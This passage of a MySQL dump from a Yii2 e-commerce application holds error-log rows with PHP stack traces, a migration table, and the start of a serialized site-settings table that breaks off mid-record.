INSERT INTO `log` VALUES ('68', '1', 'yii\\base\\ErrorException:8', '1495120872.6673', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+23%3a21%3a12&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+23%3a21%3a12&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][bnrvsmrfa1iba274gbi8updqe3]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('69', '1', 'yii\\base\\ErrorException:8', '1495122674.8463', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+23%3a51%3a14&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+23%3a51%3a14&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][9ljrvjc93ds6pc4hf8clfjg355]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('70', '1', 'yii\\base\\ErrorException:8', '1495124476.7733', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f19+00%3a21%3a16&sysorderid=1705182246441090653&completiontime=2017%2f05%2f19+00%3a21%3a16&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][j7cmbqnubg60ev164ofb4s7kg0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('71', '1', 'yii\\base\\ErrorException:8', '1495126278.0375', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f19+00%3a51%3a17&sysorderid=1705182246441090653&completiontime=2017%2f05%2f19+00%3a51%3a17&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][jo82dhujqoegqnjeurj380tjj2]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('72', '1', 'yii\\base\\ErrorException:8', '1495129880.2865', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f19+01%3a51%3a19&sysorderid=1705182246441090653&completiontime=2017%2f05%2f19+01%3a51%3a19&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][2sssgtpirnnbsvsqr1gmuv8pe7]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('73', '1', 'yii\\base\\ErrorException:1', '1503539263.4478', '[GET][http://x57.com/admin/risk/control][127.0.0.1][1][k07c62449j1269tpkfecnpllq1]', 'exception \'yii\\base\\ErrorException\' with message \'Class \'admin\\controllers\\ArrayHelper\' not found\' in D:\\wamp\\www\\xshow\\x57\\frontend\\modules\\admin\\controllers\\RiskController.php:66\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): admin\\controllers\\RiskController->actionControl()\n#1 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): ::call_user_func_array:{D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php:55}()\n#2 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams()\n#3 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\base\\Controller->runAction()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\web\\Application.php(84): yii\\base\\Module->runAction()\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\web\\Application->handleRequest()\n#6 D:\\wamp\\www\\xshow\\x57\\frontend\\web\\index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('74', '1', 'yii\\base\\UnknownPropertyException', '1503539734.1728', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('75', '1', 'yii\\base\\UnknownPropertyException', '1503539735.6268', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('76', '1', 'yii\\base\\UnknownPropertyException', '1503539737.3328', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('77', '1', 'yii\\base\\UnknownPropertyException', '1503539738.7668', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('78', '1', 'yii\\base\\UnknownPropertyException', '1503539740.1698', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('79', '1', 'yii\\base\\UnknownPropertyException', '1503539741.5308', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('80', '1', 'yii\\base\\UnknownPropertyException', '1503539742.9558', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');
INSERT INTO `log` VALUES ('81', '1', 'yii\\base\\UnknownPropertyException', '1503539744.3958', '', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: console\\models\\GatherXinfu::now\' in D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Object.php:138\nStack trace:\n#0 D:\\wamp\\www\\xshow\\x57\\console\\models\\Gather.php(76): yii\\base\\Object->__get(\'now\')\n#1 D:\\wamp\\www\\xshow\\x57\\console\\models\\GatherXinfu.php(136): console\\models\\Gather->insert(\'mila\', Array)\n#2 D:\\wamp\\www\\xshow\\x57\\console\\controllers\\InitController.php(54): console\\models\\GatherXinfu->run()\n#3 [internal function]: console\\controllers\\InitController->actionGather2()\n#4 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(55): call_user_func_array(Array, Array)\n#5 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#6 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Controller.php(119): yii\\base\\Controller->runAction(\'gather2\', Array)\n#7 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Module.php(454): yii\\console\\Controller->runAction(\'gather2\', Array)\n#8 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(176): yii\\base\\Module->runAction(\'init/gather2\', Array)\n#9 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\console\\Application.php(143): yii\\console\\Application->runAction(\'init/gather2\', Array)\n#10 D:\\wamp\\www\\xshow\\x57\\vendor\\yiisoft\\yii2\\base\\Application.php(375): yii\\console\\Application->handleRequest(Object(yii\\console\\Request))\n#11 D:\\wamp\\www\\xshow\\x57\\yii(27): yii\\base\\Application->run()\n#12 {main}');

-- ----------------------------
-- Table structure for migration
-- ----------------------------
DROP TABLE IF EXISTS `migration`;
CREATE TABLE `migration` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `version` varchar(80) NOT NULL,
  `apply_time` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COMMENT='数据库版本迁移表';

-- ----------------------------
-- Records of migration
-- ----------------------------
INSERT INTO `migration` VALUES ('1', '20161129_021731_1_8QbXPA.data', '1480385851');
INSERT INTO `migration` VALUES ('2', '20161130_070959_1_gDGope.data', '1480499011');
INSERT INTO `migration` VALUES ('3', '20161201_033737_1_svMwUS.data', '1480586602');
INSERT INTO `migration` VALUES ('4', '20170210_053450_1_myNgtM.data', '1486705062');
INSERT INTO `migration` VALUES ('5', '20170620_061002_2_ARdR3K.data', '1497939002');
INSERT INTO `migration` VALUES ('6', '20170620_100837_3_RxtYU4.data', '1497953317');
INSERT INTO `migration` VALUES ('7', '20170621_023554_1_92bxoM.data', '1498012554');
INSERT INTO `migration` VALUES ('8', '20170621_033113_2_DpRVKV.data', '1498015873');
INSERT INTO `migration` VALUES ('9', '20170621_095227_3_vvo8LZ.data', '1498038747');
INSERT INTO `migration` VALUES ('10', '20170622_030523_1_t32sbP.data', '1498100723');
INSERT INTO `migration` VALUES ('11', '20170622_032420_2_aD2bAl.data', '1498101860');
INSERT INTO `migration` VALUES ('12', '20170622_085116_3_0wW1ke.data', '1498121476');

-- ----------------------------
-- Table structure for option
-- ----------------------------
DROP TABLE IF EXISTS `option`;
CREATE TABLE `option` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `option_name` varchar(64) NOT NULL DEFAULT '' COMMENT '配置名',
  `option_value` longtext COMMENT '配置值',
  `type` tinyint(4) DEFAULT '1' COMMENT '配置类型',
  `state` tinyint(4) DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `option_name` (`option_name`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COMMENT='参数配置表';

-- ----------------------------
-- Records of option
-- ----------------------------
INSERT INTO `option` VALUES ('1', 'frontend_settings', 'a:13:{i:0;a:10:{s:2:\"id\";i:1;s:3:\"pid\";s:1:\"0\";s:4:\"name\";s:12:\"网站设置\";s:3:\"var\";N;s:5:\"value\";N;s:4:\"type\";N;s:5:\"alter\";N;s:7:\"comment\";N;s:5:\"level\";i:1;s:7:\"uploads\";a:0:{}}i:1;a:10:{s:2:\"id\";i:10;s:3:\"pid\";s:1:\"0\";s:4:\"name\";s:12:\"分销设置\";s:3:\"var\";N;s:5:\"value\";N;s:4:\"type\";N;s:5:\"alter\";N;s:7:\"comment\";N;s:5:\"level\";i:1;s:7:\"uploads\";a:0:{}}i:2;a:10:{s:2:\"id\";i:2;s:3:\"pid\";s:1:\"1\";s:4:\"name\";s:12:\"公共设置\";s:3:\"var\";N;s:5:\"value\";N;s:4:\"type\";N;s:5:\"alter\";N;s:7:\"comment\";N;s:5:\"level\";i:2;s:7:\"uploads\";a:0:{}}i:3;a:10:{s:2:\"id\";i:6;s:3:\"pid\";s:1:\"1\";s:4:\"name\";s:9:\"SEO设置\";s:3:\"var\";N;s:5:\"value\";N;s:4:\"type\";N;s:5:\"alter\";N;s:7:\"comment\";N;s:5:\"level\";i:2;s:7:\"uploads\";a:0:{}}i:5;a:10:{s:2:\"id\";i:3;s:3:\"pid\";s:1:\"2\";s:4:\"name\";s:12:\"网站名称\";s:3:\"var\";s:8:\"web_name\";s:5:\"value\";s:2:\"57\";s:4:\"type\";s:4:\"text\";s:5:\"alter\";N;s:7:\"comment\";s:12:\"网站名称\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:6;a:10:{s:2:\"id\";i:4;s:3:\"pid\";s:1:\"2\";s:4:\"name\";s:10:\"网站LOGO\";s:3:\"var\";s:8:\"web_logo\";s:5:\"value\";s:45:\"/uploadfile/setting/20170227/170348164720.jpg\";s:4:\"type\";s:4:\"file\";s:5:\"alter\";N;s:7:\"comment\";s:10:\"网站LOGO\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:7;a:10:{s:2:\"id\";i:5;s:3:\"pid\";s:1:\"2\";s:4:\"name\";s:12:\"短信签名\";s:3:\"var\";s:8:\"web_sign\";s:5:\"value\";s:12:\"涨云商城\";s:4:\"type\";s:4:\"text\";s:5:\"alter\";N;s:7:\"comment\";s:27:\"短信签名，2-5个汉字\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:8;a:10:{s:2:\"id\";i:7;s:3:\"pid\";s:1:\"6\";s:4:\"name\";s:9:\"SEO开关\";s:3:\"var\";s:11:\"seo_default\";s:5:\"value\";s:1:\"1\";s:4:\"type\";s:5:\"radio\";s:5:\"alter\";s:40:\"a:2:{i:1;s:6:\"开启\";i:0;s:6:\"关闭\";}\";s:7:\"comment\";s:33:\"是否开启SEO的默认设置值\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:9;a:10:{s:2:\"id\";i:8;s:3:\"pid\";s